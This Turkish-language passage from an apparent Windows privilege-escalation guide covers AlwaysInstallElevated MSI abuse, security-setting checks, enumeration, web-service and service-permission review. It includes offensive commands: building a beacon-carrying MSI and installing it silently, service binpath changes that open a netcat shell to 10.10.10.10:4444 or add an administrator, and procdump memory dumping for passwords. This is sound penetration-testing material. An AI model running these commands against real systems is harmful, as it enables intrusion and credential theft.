Oluşturulan binary'yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu öğreticiyi okuyun. Yalnızca **komut satırlarını** **çalıştırmak** istiyorsanız "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- **AlwaysPrivesc** gibi bir proje adı girin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- 3/4. adıma (include edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayıp az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - Yüklü uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz Beacon payload'ı yürütülür.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build edin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **kurulumunu arka planda** çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar nelerin **kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de günlüklerin nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** için tasarlanmıştır ve her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izinler verilmiş kullanıcılar tarafından görüntülenebilir.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS'te** (Local Security Authority Subsystem Service) saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1**'den itibaren Microsoft, sistemi daha da güvenli hâle getirmek için güvenilmeyen süreçlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla Local Security Authority (LSA) için gelişmiş koruma özellikleri sundu.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10** ile kullanıma sunuldu. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıklarınızı yükseltmek için bunları nasıl kötüye kullanabileceğiniz hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** kavramı hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
İlgi çekici token’lar ve bunları nasıl kötüye kullanabileceğiniz hakkında bilgi edinmek için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Sessions

```bash
qwinsta
klist sessions
```

### Ana klasörler

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola İlkesi

```bash
net accounts
```

### Panodaki içeriği alma

```bash
powershell -command "Get-Clipboard"
```

## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle, süreçleri listelerken süreçlerin komut satırında parola olup olmadığını **kontrol edin**.\
Çalışan bir ikili dosyanın üzerine yazıp yazamayacağınızı veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) gerçekleştirmek için ikili dosyanın bulunduğu klasörde yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; bunları privileges escalate etmek için kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port snapshot'ında görünmemesi, hiçbir zaman erişime açılmadığını kanıtlamaz. Gözlemlenen listener'ı PID'si, process sahibi ve düşük ayrıcalıklı kullanıcının ona erişebilme olanağıyla ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arası code execution olduğunu kanıtlamaz. Rutin enumeration işlemlerini pasif tutun; debugger komutları göndermeyin.

**Process binary'lerinin izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreçlerin ikili dosyalarının bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dinamik ön işlemci dizinleri

Snort 2, yapılandırmada `snort.exe -c <config>` ile seçilen bir `dynamicpreprocessor directory` üzerinden paylaşılan kitaplıkları yükleyebilir. Snort'u farklı bir hesap altında çalıştıran zamanlanmış bir görev veya hizmet için, kullanılan yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız burada dosya oluşturabiliyorsa bu yol, görev veya hizmet modülleri bir sonraki yüklediğinde kod yürütme açısından incelenmeye değer bir adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve varsa deny ya da paylaşım kısıtlamalarını doğrulayın; yalnızca dizinin yazılabilir olması ayrıcalık yükseltmesini kanıtlamaz. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme), çalışma zamanında modül yüklemeyi açıklar.

### Yazılabilir belge köküne sahip ayrıcalıklı web hizmeti

Windows'taki bir Apache kurulumunda, hizmetin çalıştırılabilir dosya yolunu ve çalıştırma hesabını etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Geleneksel bir XAMPP yerleşiminde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış belge kökünün (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Apache `LocalSystem` olarak çalışırken daha düşük ayrıcalıklı bir kullanıcı bu kökte dosya oluşturabiliyorsa, sunucu tarafında kod yürütülmesi ana makinenin ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak belirtilen yolun sunulduğunu ve dosya türünün sunucu tarafında işlendiğini doğrulayın; yalnızca yazılabilir bir kök dizin, dosya oluşturulabildiğini kanıtlar. Yoklama amacıyla dosya yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümlendirilmiş bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (`32-bit` yerleşim için `C:\wamp\...`) işaret edebilir; yapılandırma dosyası da yanındaki `conf\httpd.conf` konumunda, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` konumunda olabilir. Tam hizmet görüntü yolunu, çalıştırma kimliğini, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dâhil) ve kök dizinin ACL’sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache’nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı yürüttüğünü kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve uygulama havuzu ağ kimliği

IIS için, yazılabilir bir fiziksel dizini `applicationHost.config` içindeki **etkin bir site/uygulamayla** eşleştirin; ardından yapılandırılmış havuzu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS bu dosya türünü işliyorsa ve ilgili rotaya erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce mevcut kullanıcının etkin dosya oluşturma erişimini, sitenin çalışma durumunu, işleyiciyi ve yol bazındaki geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi ayrıca incelenmesi gereken ayrı bir yol oluşturur: uygulamanın derleme dizinindeki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir belirteç, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak kodu değiştirebiliyorsa, bu uygulamanın kodu daha ayrıcalıklı bir [işçi süreci kimliği](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL’si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkin belirteç ve ACL, derleme ayarları, süreç kimliği ve olası yeniden derlemenin zamanlamasıyla ilişkilendirin. Salt okunur üstverileri inceleyin; envanter çıkarırken derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel belirteci düşük ayrıcalıklı olsa bile etki alanı kaynaklarında genellikle **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerelde zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise genellikle anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu, yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini belgeliyor](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzu ağ kimliğini açıklıyor](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Atlanmış bir kimlik ayarı, IIS sürümüne göre değişen havuz varsayılanlarını devralabilir; bu nedenle havuz adından tahmin yürütmek yerine etkin yapılandırmayı belirleyin. Kod yürütme, ağda bilgisayar kimliği kullanan bir havuza ulaşıyorsa, **ilgili bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu hakları kanıtlamaz. Pasif envanter çıkarma sırasında dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırma ve ACL’leri inceleyin.

Yardımcı bir süreç başlatan, okunabilir bir ASP.NET işleyicisi için istekten türetilen değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarında izleyin. Kodlanmış bir belirteci `ProcessStartInfo("cmd", "/c ...")` içine birleştiren bir işleyici, kabuk meta karakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağırıcının çözümlenmiş değeri gerçekten etkileyebildiğini ve işleyiciye erişebildiğini belirleyin; ardından etkin uygulama havuzu veya kimliğe bürünme kimliğini ve alt sürecin kimliğini saptayın. Okunabilir bir kaynak kod satırı, localhost dinleyicisi veya belirteç biçimindeki zayıflık tek başına ayrıcalıklı komut yürütüldüğünü kanıtlamaz. Pasif envanter çıkarma sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodunu ve havuz yapılandırmasını inceleyin.

Windows üzerindeki bir PHP hizmetinde, istekle kontrol edilen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) içine aktarılan bir yol, düşük kullanıcının yazabildiği bir PHP dosyasını işçi kimliğiyle değerlendirebilir. İsteğin ilgili ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve işçinin okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve işçinin gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Tek başına bir loopback dinleyicisi veya yazılabilir dosya bu zinciri kanıtlamaz; pasif envanter çıkarma sırasında uç noktayı çağırmadan kaynak kodunu, hizmet kimliğini ve dosya ACL’lerini inceleyin.

### Bellekten parola madenciliği

**procdump** adlı sysinternals aracıyla çalışan bir sürecin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte düz metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" aratın, "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcı derlemesini inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML harici varlıklarının kullanılmasına izin veriyordu; Windows'ta bir ağ varlığı, [giden SMB ve NTLM ilkeleri](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa, içe aktaran hesabın kimlik doğrulama yapmasına neden olabilirdi. Bu, kimlik bilgilerinin açığa çıkma olasılığıdır; doğrudan yönetici erişimi değildir: yanıtın ayrı ve yetkili ya da savunmasız bir yol üzerinden kullanılabilir olması gerekir ve mevcut derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif keşif sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` izni](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki izinlerden ayrıdır. Bu izin için başarılı, salt okunur bir [`OpenSCManager` erişim isteği](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw), incelenmeye değer bir bulgudur; yeni bir hizmetin çalıştırılabileceğinin kanıtı değildir. [`CreateService` bir tanıtıcı döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu tanıtıcı, oluşturma sırasında istenen hizmet erişim haklarına sahiptir. Hizmetin daha sonra yeniden açılması ayrı bir erişim denetimine tabidir ve ilk tanıtıcı kullanılabiliyor olsa bile başarısız olabilir. Etkin yerel veya uzak token'ı, tanıtıcıya verilen hakları, hizmet hesabını, başlatma ilkesini ve yürütülebilir dosya yolunu ayrı ayrı doğrulayın. Pasif keşif sırasında hizmet oluşturmayın veya başlatmayın.

Uzak bir hizmet yükleme yolu için, bu SCM izinlerini hedefte aynı ağ oturum açma işleminin yazabildiği bir paylaşımla, paylaşımın temelindeki NTFS ACL'leriyle ve hizmet hesabının çalıştırabildiği yerel bir yürütülebilir dosya yoluyla ilişkilendirin. Olağan dışı ölçüde geniş SCM izinleri ile dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu bir önkoşul değildir. Tek başına paylaşıma yazma erişimi veya SCM hizmet oluşturma bulgusu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini kanıtlamaz.

Mevcut bir hizmet, yardımcı dosya `ImagePath` içinde bulunmasa bile başlangıç, kapanış veya başka bir yaşam döngüsü olayında bir yardımcı yürütülebilir dosyayı çağırabilir. Yardımcı dosyanın adı, daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizinde çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen yürütülebilir dosya yolunu ve arama sırasını, dizin oluşturma izinlerini, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yükleyeceğini kanıtlamaz; pasif incelemede hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` işlevine bağımsız değişkenler verilmesine izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu izin, [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) izninden ayrıdır. Başlatma erişimini yalnızca bir denetim izninden fazlası olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın seçtiği bir bağımsız değişkeni günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, bağımsız değişkenden yazma işlemine giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korunan bir dizine yazma işlemi, ancak ayrı bir ayrıcalıklı tüketici veya yükleyici bu dosyayı kabul ediyorsa ayrıcalık yükseltmeye dönüşebilir; tek başına yazılabilir bir günlük veya başlatma izni yeterli değildir. Pasif envanter çıkarma sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

Bir NSClient++ izleme aracısı için okunabilir bir `nsclient.ini` dosyası bir **yapılandırma inceleme bulgusudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı yürütme için ek olarak `CheckExternalScripts` (veya etkin başka bir yürütme yolu), bir komutu kaydetme ya da değiştirme konusunda geçerli bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback adresini dinleyen bir dinleyici de yerel bir kullanıcı tarafından erişilebilir olabilir; ancak dosya yolu, parola veya dinleyici tek başına bu hakları kanıtlamaz. Pasif keşif sırasında sırları görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya yerleşimi](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenlik rehberi](https://nsclient.org/docs/setup/securing/) ve [harici script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmet için, hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM, alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Sarmalayıcının izinlerini tüm hizmet sınırı olarak değerlendirmeden önce alt yürütülebilir dosyayı ve üst dizinlerinin ACL'lerini kontrol edin. Bu alt uygulamanın açığa çıkardığı yerel bir WCF veya SOAP uç noktası, ayrıca incelenmesi gereken bir bulgudur: daha düşük ayrıcalıklı kullanıcının dinleyiciye erişebildiğini, tam olarak hangi işlemin bu kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, bir uç nokta URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif keşif sırasında hizmet işlemlerini çağırmayın.

Özel bir WCF işlemi için, çağıran tarafından denetlenen bir dizenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript`, script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke`, pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows taşıma kimlik bilgilerini kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Daha düşük ayrıcalıklı bir çağıranın girdisinden daha yüksek ayrıcalıklı bir hizmet kimliği altında `AddScript`'e giden bir yol, kod yürütme sınırıdır; yalnızca dinleme yapan bir port, kimliği doğrulanmış bir istemci veya ilgisiz bir derlemedeki kullanılmayan bir yöntem kanıt değildir. Keşif sırasında uç noktayı çağırmadan dağıtılmış hizmeti, sözleşmeyi, yetkilendirmeyi ve kimliğe bürünme ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar (adlandırılmış pipe/RPC uç noktası etkinliği, ETW olayları, IP kullanılabilirliği, cihaz bağlantısı, GPO yenilemesi vb.) oluştuğunda Windows'un bir hizmeti başlatmasını sağlar. SERVICE_START izni olmasa bile, tetikleyicilerini etkinleştirerek ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Keşif ve etkinleştirme tekniklerini burada bulabilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcısı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmet DACL sıfırlama işlemini yönlendirmek için bir junction ve object-manager-link race kullandı. Gösterilen ayrıcalık yükseltme saldırısı ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve bu yoldaki `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bileşendeki açık Ocak 2024'te giderildi.

Pasif ilk değerlendirme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir hizmet girdisi, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana bilgisayarın savunmasız olduğunu kanıtlamaz. İnceleme sırasında hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_'tan **accesschk** ikili dosyasına sahip olmanız önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı veya kendisiyle ilişkili etkin bir aygıt yok._

Hizmeti şu komutla etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis ikili dosya yolunu değiştirme**

"Kimliği doğrulanmış kullanıcılar" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin çalıştırılabilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

İzinler aracılığıyla ayrıcalıklar çeşitli şekillerde yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Hizmet ikilisinin yeniden yapılandırılmasına olanak tanır.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve hizmet yapılandırmalarını değiştirme olanağı verir.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Hizmet yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Hizmet yapılandırmalarını değiştirme yeteneğini de devralır.

